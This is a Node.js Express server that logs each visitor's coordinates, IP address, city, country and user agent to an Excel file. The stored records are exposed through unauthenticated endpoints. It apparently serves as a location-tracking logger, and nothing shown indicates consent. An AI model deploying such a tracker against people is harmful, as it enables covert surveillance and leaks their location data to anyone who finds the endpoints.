// server.js
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const XLSX = require('xlsx');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static('public'));

const EXCEL_FILE = path.join(__dirname, 'locations.xlsx');

// ===== EXCEL FUNCTIONS =====

function initExcelFile() {
    if (!fs.existsSync(EXCEL_FILE)) {
        const headers = [
            'ID', 'Timestamp', 'Date', 'Time', 'Latitude', 'Longitude',
            'Accuracy (m)', 'Source', 'IP Address', 'City', 'Country',
            'User Agent', 'Maps Link'
        ];
        const ws = XLSX.utils.aoa_to_sheet([headers]);
        const wb = XLSX.utils.book_new();
        XLSX.utils.book_append_sheet(wb, ws, 'Locations');
        XLSX.writeFile(wb, EXCEL_FILE);
        console.log('✅ Excel file created');
    }
}

function saveLocationToExcel(locationData) {
    try {
        let wb, ws;
        if (fs.existsSync(EXCEL_FILE)) {
            wb = XLSX.readFile(EXCEL_FILE);
            ws = wb.Sheets['Locations'];
        } else {
            initExcelFile();
            wb = XLSX.readFile(EXCEL_FILE);
            ws = wb.Sheets['Locations'];
        }

        const existingData = XLSX.utils.sheet_to_json(ws);
        const nextId = existingData.length + 1;
        const timestamp = new Date(locationData.timestamp || Date.now());

        const newRow = {
            'ID': nextId,
            'Timestamp': timestamp.toISOString(),
            'Date': timestamp.toLocaleDateString(),
            'Time': timestamp.toLocaleTimeString(),
            'Latitude': locationData.latitude,
            'Longitude': locationData.longitude,
            'Accuracy (m)': locationData.accuracy || 'N/A',
            'Source': locationData.source || 'IP',
            'IP Address': locationData.ip || 'N/A',
            'City': locationData.city || 'N/A',
            'Country': locationData.country || 'N/A',
            'User Agent': locationData.userAgent || 'N/A',
            'Maps Link': locationData.mapsLink || `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
        };

        const newData = [...existingData, newRow];
        const newWs = XLSX.utils.json_to_sheet(newData);
        newWs['!cols'] = [
            { wch: 5 }, { wch: 25 }, { wch: 12 }, { wch: 10 },
            { wch: 15 }, { wch: 15 }, { wch: 12 }, { wch: 12 },
            { wch: 15 }, { wch: 20 }, { wch: 20 }, { wch: 40 }, { wch: 50 }
        ];

        wb.Sheets['Locations'] = newWs;
        XLSX.writeFile(wb, EXCEL_FILE);
        console.log(`✅ Location saved to Excel (ID: ${nextId})`);
        return true;
    } catch (error) {
        console.error('❌ Excel save error:', error);
        return false;
    }
}

function getAllLocations() {
    try {
        if (fs.existsSync(EXCEL_FILE)) {
            const wb = XLSX.readFile(EXCEL_FILE);
            const ws = wb.Sheets['Locations'];
            return XLSX.utils.sheet_to_json(ws);
        }
        return [];
    } catch (error) {
        console.error('❌ Read error:', error);
        return [];
    }
}

initExcelFile();

// ===== ROUTES =====

// Main page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// View Excel data in table format (SEPARATE URL)
app.get('/view-excel', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'view-excel.html'));
});

// API: Get all locations as JSON
app.get('/api/locations', (req, res) => {
    try {
        const data = getAllLocations();
        res.json({ success: true, data: data });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// API: Get location count
app.get('/api/count', (req, res) => {
    try {
        const data = getAllLocations();
        res.json({ success: true, count: data.length });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// API: Get IP location
app.get('/api/ip-location', async (req, res) => {
    try {
        let clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
                       req.connection.remoteAddress || 
                       req.ip;

        if (clientIP.startsWith('::ffff:')) {
            clientIP = clientIP.substring(7);
        }

        if (clientIP === '::1' || clientIP === '127.0.0.1' || clientIP === 'localhost') {
            return res.json({
                success: true,
                data: {
                    latitude: 40.7128,
                    longitude: -74.0060,
                    city: 'New York (Test)',
                    country: 'US',
                    ip: '127.0.0.1',
                    accuracy: 'IP-based',
                    source: 'IP (Test)'
                }
            });
        }

        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);
        
        const response = await fetch(`http://ip-api.com/json/${clientIP}?fields=status,lat,lon,city,country,query`, {
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        
        const data = await response.json();

        if (data.status === 'success') {
            res.json({
                success: true,
                data: {
                    latitude: data.lat,
                    longitude: data.lon,
                    city: data.city || 'Unknown',
                    country: data.country || 'Unknown',
                    ip: data.query,
                    accuracy: 'IP-based',
                    source: 'IP'
                }
            });
        } else {
            res.json({
                success: true,
                data: {
                    latitude: 40.7128,
                    longitude: -74.0060,
                    city: 'Unknown',
                    country: 'Unknown',
                    ip: clientIP,
                    accuracy: 'IP-based (fallback)',
                    source: 'IP (Fallback)'
                }
            });
        }
    } catch (error) {
        console.error('IP location error:', error);
        res.json({
            success: true,
            data: {
                latitude: 40.7128,
                longitude: -74.0060,
                city: 'Unknown',
                country: 'Unknown',
                ip: 'Unknown',
                accuracy: 'IP-based (error fallback)',
                source: 'IP (Error)'
            }
        });
    }
});

// API: Track location and save to Excel
app.post('/api/track-location', async (req, res) => {
    console.log('📍 Location tracked');
    
    try {
        const { latitude, longitude, accuracy, source, userAgent, autoFetched, ip, city, country } = req.body;

        if (!latitude || !longitude) {
            return res.status(400).json({ success: false, message: 'Missing coordinates' });
        }

        const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

        const locationData = {
            latitude,
            longitude,
            accuracy: accuracy || 0,
            source: source || 'IP',
            ip: ip || 'N/A',
            city: city || 'N/A',
            country: country || 'N/A',
            userAgent: userAgent || 'N/A',
            mapsLink: mapsLink,
            timestamp: new Date().toISOString()
        };

        saveLocationToExcel(locationData);

        res.json({
            success: true,
            message: 'Location tracked and saved!',
            mapsLink: mapsLink
        });

    } catch (error) {
        console.error('❌ Server error:', error);
        res.status(500).json({ success: false, message: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`\n🚀 Server running on port ${PORT}`);
    console.log(`📊 Excel file: ${EXCEL_FILE}`);
    console.log(`📍 Main page: http://localhost:${PORT}`);
    console.log(`📋 View Excel: http://localhost:${PORT}/view-excel\n`);
});
